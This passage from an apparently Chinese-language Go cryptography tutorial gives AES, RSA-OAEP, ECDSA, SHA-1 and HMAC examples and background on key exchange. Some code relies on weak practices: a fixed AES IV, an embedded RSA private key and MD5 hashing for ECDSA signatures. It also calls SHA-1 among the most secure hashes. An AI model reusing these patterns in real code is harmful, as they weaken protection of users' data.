class="title">encrypt</span><span class="params">(plainText <span class="keyword">string</span>, keyText <span class="keyword">string</span>)</span> <span class="params">(cipherByte []<span class="keyword">byte</span>, err error)</span></span> &#123;</div><div class="line">	<span class="comment">// 转换成字节数据, 方便加密</span></div><div class="line">	plainByte := []<span class="keyword">byte</span>(plainText)</div><div class="line">	keyByte := []<span class="keyword">byte</span>(keyText)</div><div class="line"></div><div class="line">	<span class="comment">// 创建加密算法aes</span></div><div class="line">	c, err := aes.NewCipher(keyByte)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//加密字符串</span></div><div class="line">	cfb := cipher.NewCFBEncrypter(c, commonIV)</div><div class="line">	cipherByte = <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(plainByte))</div><div class="line">	cfb.XORKeyStream(cipherByte, plainByte)</div><div class="line">	<span class="keyword">return</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">decrypt</span><span class="params">(cipherByte []<span class="keyword">byte</span>, keyText <span class="keyword">string</span>)</span> <span class="params">(plainText <span class="keyword">string</span>, err error)</span></span> &#123;</div><div class="line">	<span class="comment">// 转换成字节数据, 方便加密</span></div><div class="line">	keyByte := []<span class="keyword">byte</span>(keyText)</div><div class="line"></div><div class="line">	<span class="comment">// 创建加密算法aes</span></div><div class="line">	c, err := aes.NewCipher(keyByte)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="string">""</span>, err</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// 解密字符串</span></div><div class="line">	cfbdec := cipher.NewCFBDecrypter(c, commonIV)</div><div class="line">	plainByte := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(cipherByte))</div><div class="line">	cfbdec.XORKeyStream(plainByte, cipherByte)</div><div class="line">	plainText = <span class="keyword">string</span>(plainByte)</div><div class="line">	<span class="keyword">return</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	plain := <span class="string">"The text need to be encrypt."</span></div><div class="line">	<span class="comment">// AES 规定有3种长度的key: 16, 24, 32分别对应AES-128, AES-192, or AES-256</span></div><div class="line">	key := <span class="string">"abcdefgehjhijkmlkjjwwoew"</span></div><div class="line">	<span class="comment">// 加密</span></div><div class="line">	cipherByte, err := encrypt(plain, key)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(err)</div><div class="line">	&#125;</div><div class="line">	fmt.Printf(<span class="string">"%s ==&gt; %x\n"</span>, plain, cipherByte)</div><div class="line">	<span class="comment">// 解密</span></div><div class="line">	plainText, err := decrypt(cipherByte, key)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(err)</div><div class="line">	&#125;</div><div class="line">	fmt.Printf(<span class="string">"%x ==&gt; %s\n"</span>, cipherByte, plainText)</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="非对称算法"><a href="#非对称算法" class="headerlink" title="非对称算法"></a>非对称算法</h3><p>非对称加密算法常用于数据加密和身份认证, 常见的非对称加密算法如下：</p>
<ul>
<li>RSA: 由RSA公司发明，是一个支持变长密钥的公共密钥算法，需要加密的文件块的长度也是可变的；</li>
<li>DSA(Digital Signature Algorithm): 数字签名算法，是一种标准的DSS(数字签名标准)；</li>
<li>ECC(Elliptic Curves Cryptography): 椭圆曲线密码编码学。</li>
<li>ECDSA(Elliptic Curve Digital Signature Algorithm): 基于椭圆曲线的DSA签名算法</li>
</ul>
<h4 id="DSA"><a href="#DSA" class="headerlink" title="DSA"></a>DSA</h4><p>DSA是基于整数有限域离散对数难题的，其安全性与RSA相比差不多。DSA的一个重要特点是两个素数公开，这样，当使用别人的p和q时，即使不知道私钥，你也能确认它们是否是随机产生的，还是作了手脚。RSA算法却做不到<br>但是其缺点就是只能用于数字签名, 不能用于加密。</p>
<h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>在1976年，由于对称加密算法已经不能满足需要，Diffie 和Hellman发表了一篇叫《密码学新动向》的文章，介绍了公匙加密的概念，由Rivet、Shamir、Adelman提出了RSA算法。<br>RSA是目前最有影响力的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准。</p>
<h4 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h4><p>ECC加密的原理依赖椭圆曲线上的难题。<br>今天只有短的RSA钥匙才可能被强力方式解破。到2008年为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。但在分布式计算和量子计算机理论日趋成熟的今天，RSA加密安全性受到了挑战。<br>随着分解大整数方法的进步及完善、计算机速度的提高以及计算机网络的发展，为了保障数据的安全，RSA的密钥需要不断增加，但是，密钥长度的增加导致了其加解密的速度大为降低，硬件实现也变得越来越难以忍受，这对使用RSA的应用带来了很重的负担，因此需要一种新的算法来代替RSA。<br>1985年N.Koblitz和Miller提出将椭圆曲线用于密码算法，根据是有限域上的椭圆曲线上的点群中的离散对数问题ECDLP。ECDLP是比因子分解问题更难的问题，它是指数级的难度。</p>
<h4 id="ECDSA"><a href="#ECDSA" class="headerlink" title="ECDSA"></a>ECDSA</h4><p>因为在数字签名的安全性高, 基于ECC的DSA更高, 所以非常适合数字签名使用场景, 在SSH TLS有广泛使用, ECC把离散对数安全性高很少, 所以ECC在安全领域会成为下一个标准。</p>
<h4 id="ECC与RSA的比较"><a href="#ECC与RSA的比较" class="headerlink" title="ECC与RSA的比较"></a>ECC与RSA的比较</h4><p>ECC和RSA相比，在许多方面都有对绝对的优势，主要体现在以下方面：</p>
<ul>
<li>抗攻击性强。相同的密钥长度，其抗攻击性要强很多倍。</li>
<li>计算量小，处理速度快。ECC总的速度比RSA、DSA要快得多。</li>
<li>存储空间占用小。ECC的密钥尺寸和系统参数与RSA、DSA相比要小得多，意味着它所占的存贮空间要小得多。这对于加密算法在IC卡上的应用具有特别重要的意义。</li>
<li>带宽要求低。当对长消息进行加解密时，三类密码系统有相同的带宽要求，但应用于短消息时ECC带宽要求却低得多。带宽要求低使ECC在无线网络领域具有广泛的应用前景。</li>
<li>ECC的这些特点使它必将取代RSA，成为通用的公钥加密算法。比如SET协议的制定者已把它作为下一代SET协议中缺省的公钥密码算法。<br>ECC的这些特点使它必将取代RSA，成为通用的公钥加密算法。比如SET协议的制定者已把它作为下一代SET协议中缺省的公钥密码算法。</li>
</ul>
<h4 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a>代码示例</h4><p>ECC是未来的一个趋势, 在IOT行业是一个不错的选择, 但是现在被广泛使用的依然是RSA<br>以下使用RSA进行加解密: 使用对方的公钥加密数据, 然后发给对方, 对方使用自己的私钥解密.<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"crypto/rand"</span></div><div class="line">	<span class="string">"crypto/rsa"</span></div><div class="line">	<span class="string">"crypto/sha1"</span></div><div class="line">	<span class="string">"crypto/x509"</span></div><div class="line">	<span class="string">"encoding/pem"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="comment">// 使用对方的公钥的数据, 只有对方的私钥才能解开</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">encrypt</span><span class="params">(plain <span class="keyword">string</span>, publicKey <span class="keyword">string</span>)</span> <span class="params">(cipherByte []<span class="keyword">byte</span>, err error)</span></span> &#123;</div><div class="line">	msg := []<span class="keyword">byte</span>(plain)</div><div class="line">	<span class="comment">// 解码公钥</span></div><div class="line">	pubBlock, _ := pem.Decode([]<span class="keyword">byte</span>(publicKey))</div><div class="line"></div><div class="line">	<span class="comment">// 读取公钥</span></div><div class="line">	pubKeyValue, err := x509.ParsePKIXPublicKey(pubBlock.Bytes)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="built_in">panic</span>(err)</div><div class="line">	&#125;</div><div class="line">	pub := pubKeyValue.(*rsa.PublicKey)</div><div class="line"></div><div class="line">	<span class="comment">// 加密数据方法: 不用使用EncryptPKCS1v15方法加密,源码里面推荐使用EncryptOAEP, 因此这里使用安全的方法加密</span></div><div class="line">	encryptOAEP, err := rsa.EncryptOAEP(sha1.New(), rand.Reader, pub, msg, <span class="literal">nil</span>)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="built_in">panic</span>(err)</div><div class="line">	&#125;</div><div class="line">	cipherByte = encryptOAEP</div><div class="line">	<span class="keyword">return</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 使用私钥解密公钥加密的数据</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">decrypt</span><span class="params">(cipherByte []<span class="keyword">byte</span>, privateKey <span class="keyword">string</span>)</span> <span class="params">(plainText <span class="keyword">string</span>, err error)</span></span> &#123;</div><div class="line"></div><div class="line">	<span class="comment">// 解析出私钥</span></div><div class="line">	priBlock, _ := pem.Decode([]<span class="keyword">byte</span>(privateKey))</div><div class="line">	priKey, err := x509.ParsePKCS1PrivateKey(priBlock.Bytes)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="built_in">panic</span>(err)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// 解密RSA-OAEP方式加密后的内容</span></div><div class="line">	decryptOAEP, err := rsa.DecryptOAEP(sha1.New(), rand.Reader, priKey, cipherByte, <span class="literal">nil</span>)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="built_in">panic</span>(err)</div><div class="line">	&#125;</div><div class="line">	plainText = <span class="keyword">string</span>(decryptOAEP)</div><div class="line">	<span class="keyword">return</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> &#123;</div><div class="line">	msg := <span class="string">"Content bo be encrypted!"</span></div><div class="line">	<span class="comment">// 获取公钥, 生产环境往往是文件中读取, 这里为了测试方便, 直接生成了.</span></div><div class="line">	publicKeyData := <span class="string">`-----BEGIN PUBLIC KEY-----</span></div><div class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDZsfv1qscqYdy4vY+P4e3cAtmv</div><div class="line">ppXQcRvrF1cB4drkv0haU24Y7m5qYtT52Kr539RdbKKdLAM6s20lWy7+5C0Dgacd</div><div class="line">wYWd/7PeCELyEipZJL07Vro7Ate8Bfjya+wltGK9+XNUIHiumUKULW4KDx21+1NL</div><div class="line">AUeJ6PeW+DAkmJWF6QIDAQAB</div><div class="line">-----END PUBLIC KEY-----</div><div class="line">`</div><div class="line">	<span class="comment">// 获取私钥</span></div><div class="line">	privateKeyData := <span class="string">`-----BEGIN RSA PRIVATE KEY-----</span></div><div class="line">MIICXQIBAAKBgQDZsfv1qscqYdy4vY+P4e3cAtmvppXQcRvrF1cB4drkv0haU24Y</div><div class="line">7m5qYtT52Kr539RdbKKdLAM6s20lWy7+5C0DgacdwYWd/7PeCELyEipZJL07Vro7</div><div class="line">Ate8Bfjya+wltGK9+XNUIHiumUKULW4KDx21+1NLAUeJ6PeW+DAkmJWF6QIDAQAB</div><div class="line">AoGBAJlNxenTQj6OfCl9FMR2jlMJjtMrtQT9InQEE7m3m7bLHeC+MCJOhmNVBjaM</div><div class="line">ZpthDORdxIZ6oCuOf6Z2+Dl35lntGFh5J7S34UP2BWzF1IyyQfySCNexGNHKT1G1</div><div class="line">XKQtHmtc2gWWthEg+S6ciIyw2IGrrP2Rke81vYHExPrexf0hAkEA9Izb0MiYsMCB</div><div class="line">/jemLJB0Lb3Y/B8xjGjQFFBQT7bmwBVjvZWZVpnMnXi9sWGdgUpxsCuAIROXjZ40</div><div class="line">IRZ2C9EouwJBAOPjPvV8Sgw4vaseOqlJvSq/C/pIFx6RVznDGlc8bRg7SgTPpjHG</div><div class="line">4G+M3mVgpCX1a/EU1mB+fhiJ2LAZ/pTtY6sCQGaW9NwIWu3DRIVGCSMm0mYh/3X9</div><div class="line">DAcwLSJoctiODQ1Fq9rreDE5QfpJnaJdJfsIJNtX1F+L3YceeBXtW0Ynz2MCQBI8</div><div class="line">9KP274Is5FkWkUFNKnuKUK4WKOuEXEO+LpR+vIhs7k6WQ8nGDd4/mujoJBr5mkrw</div><div class="line">DPwqA3N5TMNDQVGv8gMCQQCaKGJgWYgvo3/milFfImbp+m7/Y3vCptarldXrYQWO</div><div class="line">AQjxwc71ZGBFDITYvdgJM1MTqc8xQek1FXn1vfpy2c6O</div><div class="line">-----END RSA PRIVATE KEY-----</div><div class="line">`</div><div class="line">	cipherData, err := encrypt(msg, publicKeyData)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="built_in">panic</span>(err)</div><div class="line">	&#125;</div><div class="line">	fmt.Printf(<span class="string">"encrypt message: %x\n"</span>, cipherData)</div><div class="line"></div><div class="line">	plainData, err := decrypt(cipherData, privateKeyData)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="built_in">panic</span>(err)</div><div class="line">	&#125;</div><div class="line">	fmt.Printf(<span class="string">"decrypt message:%s\n"</span>, plainData)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	test()</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>ecdsa正在逐渐成为数字签名的一个标准, 在golang的ssh库中就是使用这个算法来签名的: A使用自己的私钥签名一段数据, 然后将公钥发放出去. 用户拿到公钥后, 验证数据的签名,如果通过则证明数据来源是A, 从而达到身份认证的作用.<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"crypto/ecdsa"</span></div><div class="line">	<span class="string">"crypto/elliptic"</span></div><div class="line">	<span class="string">"crypto/md5"</span></div><div class="line">	<span class="string">"crypto/rand"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"hash"</span></div><div class="line">	<span class="string">"io"</span></div><div class="line">	<span class="string">"math/big"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="comment">// SignData 用于保存签名的数据</span></div><div class="line"><span class="keyword">type</span> SignData <span class="keyword">struct</span> &#123;</div><div class="line">	r         *big.Int</div><div class="line">	s         *big.Int</div><div class="line">	signhash  *[]<span class="keyword">byte</span></div><div class="line">	signature *[]<span class="keyword">byte</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 使用私钥签名一段数据</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">sign</span><span class="params">(message <span class="keyword">string</span>, privateKey *ecdsa.PrivateKey)</span> <span class="params">(signData *SignData, err error)</span></span> &#123;</div><div class="line"></div><div class="line">	<span class="comment">// 签名数据</span></div><div class="line">	<span class="keyword">var</span> h hash.Hash</div><div class="line">	h = md5.New()</div><div class="line">	r := big.NewInt(<span class="number">0</span>)</div><div class="line">	s := big.NewInt(<span class="number">0</span>)</div><div class="line"></div><div class="line">	io.WriteString(h, message)</div><div class="line">	signhash := h.Sum(<span class="literal">nil</span>)</div><div class="line"></div><div class="line">	r, s, serr := ecdsa.Sign(rand.Reader, privateKey, signhash)</div><div class="line">	<span class="keyword">if</span> serr != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, serr</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	signature := r.Bytes()</div><div class="line">	signature = <span class="built_in">append</span>(signature, s.Bytes()...)</div><div class="line">	signData = &amp;SignData&#123;</div><div class="line">		r:         r,</div><div class="line">		s:         s,</div><div class="line">		signhash:  &amp;signhash,</div><div class="line">		signature: &amp;signature,</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 校验数字签名</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">verifySign</span><span class="params">(signData *SignData, publicKey *ecdsa.PublicKey)</span> <span class="params">(status <span class="keyword">bool</span>)</span></span> &#123;</div><div class="line">	status = ecdsa.Verify(publicKey, *signData.signhash, signData.r, signData.s)</div><div class="line">	<span class="keyword">return</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="comment">//使用椭圆曲线的P256算法,现在一共也就实现了4种,我们使用折中一种,具体见http://golang.org/pkg/crypto/elliptic/#P256</span></div><div class="line">	pubkeyCurve := elliptic.P256()</div><div class="line">	privateKey := <span class="built_in">new</span>(ecdsa.PrivateKey)</div><div class="line"></div><div class="line">	<span class="comment">// 生成秘钥对</span></div><div class="line">	privateKey, err := ecdsa.GenerateKey(pubkeyCurve, rand.Reader)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="built_in">panic</span>(err)</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">var</span> publicKey ecdsa.PublicKey</div><div class="line">	publicKey = privateKey.PublicKey</div><div class="line"></div><div class="line">	<span class="comment">// 签名</span></div><div class="line">	signData, err := sign(<span class="string">"This is a message to be signed and verified by ECDSA!"</span>, privateKey)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="built_in">panic</span>(err)</div><div class="line">	&#125;</div><div class="line">	fmt.Printf(<span class="string">"The signhash: %x\nThe signature: %x\n"</span>, *signData.signhash, *signData.signature)</div><div class="line"></div><div class="line">	<span class="comment">// 验证</span></div><div class="line">	status := verifySign(signData, &amp;publicKey)</div><div class="line">	fmt.Printf(<span class="string">"The verify result is: %v\n"</span>, status)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	test()</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="散列算法"><a href="#散列算法" class="headerlink" title="散列算法"></a>散列算法</h3><p>散列是信息的提炼，通常其长度要比信息小得多，且为一个固定长度。加密性强的散列一定是不可逆的，这就意味着通过散列结果，无法推出任何部分的原始信息。任何输入信息的变化，哪怕仅一位，都将导致散列结果的明显变化，这称之为雪崩效应。散列还应该是防冲突的，即找不出具有相同散列结果的两条信息。具有这些特性的散列结果就可以用于验证信息是否被修改。常用于保证数据完整性<br>单向散列函数一般用于产生消息摘要，密钥加密等，常见的有：</p>
<ul>
<li>MD5(Message Digest Algorithm 5): 是RSA数据安全公司开发的一种单向散列算法。</li>
<li>SHA(Secure Hash Algorithm): 可以对任意长度的数据运算生成一个160位的数值；</li>
</ul>
<h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><p>MD5即Message-Digest Algorithm 5（信息-摘要算法5），用于确保信息传输完整一致。是计算机广泛使用的杂凑算法之一（又译摘要算法、哈希算法），主流编程语言普遍已有MD5实现。将数据（如汉字）运算为另一固定长度值，是杂凑算法的基础原理，MD5的前身有MD2、MD3和MD4</p>
<h4 id="SHA-1"><a href="#SHA-1" class="headerlink" title="SHA-1"></a>SHA-1</h4><p>在1993年，安全散列算法（SHA）由美国国家标准和技术协会(NIST)提出，并作为联邦信息处理标准（FIPS PUB 180）公布；1995年又发布了一个修订版FIPS PUB 180-1，通常称之为SHA-1。SHA-1是基于MD4算法的，并且它的设计在很大程度上是模仿MD4的。现在已成为公认的最安全的散列算法之一，并被广泛使用。<br>SHA-1是一种数据加密算法，该算法的思想是接收一段明文，然后以一种不可逆的方式将它转换成一段（通常更小）密文，也可以简单的理解为取一串输入码（称为预映射或信息），并把它们转化为长度较短、位数固定的输出序列即散列值（也称为信息摘要或信息认证代码）的过程。<br>该算法输入报文的最大长度不超过264位，产生的输出是一个160位的报文摘要。输入是按512 位的分组进行处理的。SHA-1是不可逆的、防冲突，并具有良好的雪崩效应。<br>sha1是SHA家族的五个算法之一(其它四个是SHA-224、SHA-256、SHA-384，和SHA-512)</p>
<h4 id="HMac"><a href="#HMac" class="headerlink" title="HMac"></a>HMac</h4><p>Hmac算法也是一种哈希算法，它可以利用MD5或SHA1等哈希算法。不同的是，Hmac还需要一个密钥, 只要密钥发生了变化，那么同样的输入数据也会得到不同的签名，因此，可以把Hmac理解为用随机数“增强”的哈希算法。</p>
<h4 id="SHA-1与MD5的比较"><a href="#SHA-1与MD5的比较" class="headerlink" title="SHA-1与MD5的比较"></a>SHA-1与MD5的比较</h4><p>因为二者均由MD4导出，SHA-1和MD5彼此很相似。相应的，他们的强度和其他特性也是相似，但还有以下几点不同：</p>
<ul>
<li>对强行供给的安全性：最显著和最重要的区别是SHA-1摘要比MD5摘要长32 位。使用强行技术，产生任何一个报文使其摘要等于给定报摘要的难度对MD5是2128数量级的操作，而对SHA-1则是2160数量级的操作。这样，SHA-1对强行攻击有更大的强度。</li>
<li>对密码分析的安全性：由于MD5的设计，易受密码分析的攻击，SHA-1显得不易受这样的攻击。</li>
<li>速度：在相同的硬件上，SHA-1的运行速度比MD5慢。</li>
</ul>
<h4 id="代码示例-2"><a href="#代码示例-2" class="headerlink" title="代码示例"></a>代码示例</h4><p>由于MD5已经被破解了(中国山东大学的王小云教授破解), 常用的散列算法是sha家族, 更加安全的算法是使用Hmac<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"crypto/hmac"</span></div><div class="line">	<span class="string">"crypto/sha1"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"io"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="comment">// sha1散列算法</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">sha1Hash</span><span class="params">(msg <span class="keyword">string</span>)</span> <span class="params">(hashData []<span class="keyword">byte</span>)</span></span> &#123;</div><div class="line">	h := sha1.New()</div><div class="line">	io.WriteString(h, msg)</div><div class="line">	hashData = h.Sum(<span class="literal">nil</span>)</div><div class="line">	<span class="keyword">return</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 使用sha1的Hmac散列算法</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">hmacHash</span><span class="params">(msg <span class="keyword">string</span>, key <span class="keyword">string</span>)</span> <span class="params">(hashData []<span class="keyword">byte</span>)</span></span> &#123;</div><div class="line">	k := []<span class="keyword">byte</span>(key)</div><div class="line">	mac := hmac.New(sha1.New, k)</div><div class="line">	io.WriteString(mac, msg)</div><div class="line">	hashData = mac.Sum(<span class="literal">nil</span>)</div><div class="line">	<span class="keyword">return</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	msg := <span class="string">"This is the message to hash!"</span></div><div class="line">	<span class="comment">// sha1</span></div><div class="line">	sha1Data := sha1Hash(msg)</div><div class="line">	fmt.Printf(<span class="string">"SHA1: %x\n"</span>, sha1Data)</div><div class="line"></div><div class="line">	<span class="comment">// hmac</span></div><div class="line">	hmacData := hmacHash(msg, <span class="string">"The key string!"</span>)</div><div class="line">	fmt.Printf(<span class="string">"HMAC: %x\n"</span>, hmacData)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="秘钥交换算法"><a href="#秘钥交换算法" class="headerlink" title="秘钥交换算法"></a>秘钥交换算法</h3><p>一种密钥交换协议，注意该算法只能用于密钥的交换，而不能进行消息的加密和解密。双方确定要用的密钥后，要使用其他对称密钥操作加密算法实际加密和解密消息。它可以让双方在不泄漏密钥的情况下协商出一个密钥来, 常用于保证对称加密的秘钥的安全, TLS就是这样做的。<br>在这个领域应该2种</p>
<ul>
<li>DH：ECDH是DH的加强版</li>
<li>ECDH: DH算法的加强版, 常用的是NIST系列,但是后面curve25519</li>
<li>curve25519: 实质上也是一种ECDH,但是其实现更为优秀,表现的更为安全,可能是下一代秘钥交换算法的标准。</li>
</ul>
<h4 id="DH"><a href="#DH" class="headerlink" title="DH"></a>DH</h4><p>DH全称是:<code>Diffie-Hellman</code>, 是一种确保共享KEY安全穿越不安全网络的方法，它是OAKLEY的一个组成部分。Whitefield与Martin Hellman在1976年提出了一个奇妙的密钥交换协议，称为Diffie-Hellman密钥交换协议/算法(Diffie-Hellman Key Exchange/Agreement Algorithm).这个机制的巧妙在于需要安全通信的双方可以用这个方法确定对称密钥。然后可以用这个密钥进行加密和解密。<br>DH依赖于计算离散对数的难度, 大概过程如下:</p>
<blockquote>
<p>可以如下定义离散对数：首先定义一个素数p的原根，为其各次幂产生从1 到p-1的所有整数根，也就是说，如果a是素数p的一个原根，那么数值 a mod p,a2 mod p,…,ap-1 mod p 是各不相同的整数，并且以某种排列方式组成了从1到p-1的所有整数. 对于一个整数b和素数p的一个原根a，可以找到惟一的指数i，使得 b = a^i mod p 其中0 ≤ i ≤ （p-1） 指数i称为b的以a为基数的模p的离散对数或者指数.该值被记为inda,p(b).</p>
</blockquote>
